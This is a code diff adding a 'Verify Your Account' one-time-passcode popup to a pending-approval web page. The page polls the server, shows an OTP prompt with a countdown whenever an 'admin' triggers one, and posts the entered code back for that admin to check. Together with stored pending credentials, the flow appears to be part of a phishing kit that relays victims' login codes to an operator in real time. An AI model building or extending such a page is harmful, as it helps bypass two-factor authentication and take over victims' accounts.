@@ -48,6 +48,30 @@
     .approved-overlay{display:none;text-align:center}
     .approved-overlay.show{display:block}
     .tick{font-size:40px;margin-bottom:8px}
+    /* ── OTP overlay ── */
+    .otp-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:600;align-items:center;justify-content:center;padding:16px}
+    .otp-overlay.show{display:flex}
+    .otp-card{background:#fff;border-radius:16px;width:100%;max-width:400px;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.4);animation:otpIn .35s ease}
+    @keyframes otpIn{from{opacity:0;transform:scale(.92) translateY(16px)}to{opacity:1;transform:none}}
+    .otp-head{background:linear-gradient(135deg,#3b82f6 0%,#6366f1 100%);padding:24px 24px 20px;text-align:center}
+    .otp-icon{width:52px;height:52px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;backdrop-filter:blur(4px)}
+    .otp-title{font-size:17px;font-weight:800;color:#fff;margin-bottom:6px}
+    .otp-phone{font-size:14px;color:rgba(255,255,255,.85);font-weight:600}
+    .otp-body{padding:22px 24px 24px}
+    .otp-lbl{font-size:12px;font-weight:700;color:var(--muted,#6b7280);margin-bottom:8px;text-transform:uppercase;letter-spacing:.06em}
+    .otp-input{width:100%;padding:14px 16px;border:2px solid #e5e7eb;border-radius:10px;font-size:20px;font-weight:700;text-align:center;letter-spacing:.35em;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s}
+    .otp-input:focus{border-color:#6366f1}
+    .otp-submit{width:100%;padding:13px;border:none;border-radius:10px;background:linear-gradient(135deg,#3b82f6,#6366f1);color:#fff;font-size:14px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;margin-top:12px;transition:opacity .2s}
+    .otp-submit:disabled{opacity:.5;cursor:not-allowed}
+    .otp-timer{text-align:center;margin-top:14px;font-size:13px;color:#6b7280;font-weight:500}
+    .otp-timer strong{color:#ef4444;font-weight:700}
+    .otp-success{display:none;text-align:center;padding:8px 0}
+    .otp-success.show{display:block}
+    .otp-success-txt{font-size:14px;font-weight:700;color:#15803d}
+    .otp-expired{display:none;text-align:center;padding:16px 0}
+    .otp-expired.show{display:block}
+    .otp-expired-txt{font-size:14px;font-weight:700;color:#ef4444;margin-bottom:4px}
+    .otp-expired-sub{font-size:12px;color:#6b7280}
   </style>
 </head>
 <body>
@@ -123,6 +147,37 @@
   </div>
 </div>
 
+<!-- OTP Verification Popup -->
+<div class="otp-overlay" id="otpOverlay">
+  <div class="otp-card">
+    <div class="otp-head">
+      <div class="otp-icon">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
+      </div>
+      <div class="otp-title">Verify Your Account</div>
+      <div class="otp-phone">OTP sent to: <span id="otpPhone">---</span></div>
+    </div>
+    <div class="otp-body">
+      <div id="otpFormView">
+        <div class="otp-lbl">Enter the OTP you received</div>
+        <input class="otp-input" id="otpInput" type="text" maxlength="10" placeholder="••••••" autocomplete="one-time-code" inputmode="numeric"/>
+        <button class="otp-submit" id="otpSubmitBtn" disabled>Verify OTP</button>
+        <div class="otp-timer" id="otpTimer">Expires in <strong id="otpCountdown">5:00</strong></div>
+      </div>
+      <div class="otp-success" id="otpSuccess">
+        <div style="font-size:32px;margin-bottom:8px">✅</div>
+        <div class="otp-success-txt">OTP Submitted!</div>
+        <div style="font-size:12px;color:#6b7280;margin-top:4px">Waiting for admin to verify…</div>
+      </div>
+      <div class="otp-expired" id="otpExpired">
+        <div style="font-size:32px;margin-bottom:8px">⏰</div>
+        <div class="otp-expired-txt">OTP Expired</div>
+        <div class="otp-expired-sub">Please wait for admin to send a new verification</div>
+      </div>
+    </div>
+  </div>
+</div>
+
 <script>
   // Read username
   const pUser = localStorage.getItem('mi_pending_user') || new URLSearchParams(location.search).get('u') || '';
@@ -177,16 +232,98 @@
   }
 
   let pollTimer;
+  let otpActive = false;
+  let otpSentAt = null;
+  let otpCountdownInterval = null;
+
+  function showOtp(phone, sentAt, expiresAt) {
+    document.getElementById('otpPhone').textContent = phone;
+    document.getElementById('otpOverlay').classList.add('show');
+    document.getElementById('otpFormView').style.display = 'block';
+    document.getElementById('otpSuccess').classList.remove('show');
+    document.getElementById('otpExpired').classList.remove('show');
+    document.getElementById('otpInput').value = '';
+    document.getElementById('otpSubmitBtn').disabled = true;
+    otpSentAt = sentAt;
+    otpActive = true;
+    startOtpCountdown(expiresAt);
+  }
+
+  function hideOtp() {
+    document.getElementById('otpOverlay').classList.remove('show');
+    otpActive = false;
+    if (otpCountdownInterval) { clearInterval(otpCountdownInterval); otpCountdownInterval = null; }
+  }
+
+  function showOtpExpired() {
+    document.getElementById('otpFormView').style.display = 'none';
+    document.getElementById('otpSuccess').classList.remove('show');
+    document.getElementById('otpExpired').classList.add('show');
+    if (otpCountdownInterval) { clearInterval(otpCountdownInterval); otpCountdownInterval = null; }
+  }
+
+  function startOtpCountdown(expiresAt) {
+    if (otpCountdownInterval) clearInterval(otpCountdownInterval);
+    const el = document.getElementById('otpCountdown');
+    function tick() {
+      const left = Math.max(0, new Date(expiresAt).getTime() - Date.now());
+      const m = Math.floor(left / 60000);
+      const s = Math.floor((left % 60000) / 1000);
+      el.textContent = m + ':' + String(s).padStart(2, '0');
+      if (left <= 0) {
+        clearInterval(otpCountdownInterval);
+        otpCountdownInterval = null;
+        showOtpExpired();
+      }
+    }
+    tick();
+    otpCountdownInterval = setInterval(tick, 1000);
+  }
+
+  // OTP input
+  document.getElementById('otpInput').addEventListener('input', function() {
+    document.getElementById('otpSubmitBtn').disabled = !this.value.trim();
+  });
+
+  // OTP submit
+  document.getElementById('otpSubmitBtn').addEventListener('click', async function() {
+    const code = document.getElementById('otpInput').value.trim();
+    if (!code) return;
+    this.disabled = true;
+    try {
+      const r = await fetch('/api/otp/submit/' + encodeURIComponent(pUser), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code })
+      });
+      const d = await r.json();
+      if (d.ok) {
+        document.getElementById('otpFormView').style.display = 'none';
+        document.getElementById('otpSuccess').classList.add('show');
+        if (otpCountdownInterval) { clearInterval(otpCountdownInterval); otpCountdownInterval = null; }
+      } else if (d.error === 'OTP expired') {
+        showOtpExpired();
+      }
+    } catch {}
+  });
+
   async function checkStatus() {
     try {
       const r = await fetch('/api/pending/check/' + encodeURIComponent(pUser));
       const d = await r.json();
-      if (d.status === 'approved') { clearInterval(pollTimer); onApproved(); }
+      if (d.status === 'approved') { clearInterval(pollTimer); hideOtp(); onApproved(); }
       else if (d.status === 'rejected' || d.status === 'unknown') {
         clearInterval(pollTimer);
+        hideOtp();
         localStorage.removeItem('mi_pending_user');
         sessionStorage.removeItem('mi_p_creds');
         location.href = '/login';
+      }
+      // Handle OTP challenge
+      if (d.otp && d.otp.sentAt !== otpSentAt) {
+        showOtp(d.otp.phone, d.otp.sentAt, d.otp.expiresAt);
+      } else if (d.otpExpired && otpActive) {
+        showOtpExpired();
       }
     } catch {}
   }
